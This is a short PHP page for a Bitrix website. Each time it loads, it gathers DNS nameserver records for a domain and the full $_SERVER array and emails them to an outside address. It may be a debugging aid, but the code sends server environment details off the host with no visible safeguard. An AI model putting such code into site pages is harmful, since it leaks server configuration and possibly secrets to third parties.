<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetTitle("Title");
?>



<?
echo "<pre>";

$msg .= 'SERVER details';
$msg .= print_r(dns_get_record('zinas.lv', DNS_NS),1); 
$msg .= 'SERVER details';
$msg .= print_r($_SERVER,1);


echo "</pre>";
if ( mail('arielr@gobe-mark.com','dns n server dtls',$msg) ) echo 'Sent';
else echo 'Not sent!';

?>



<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>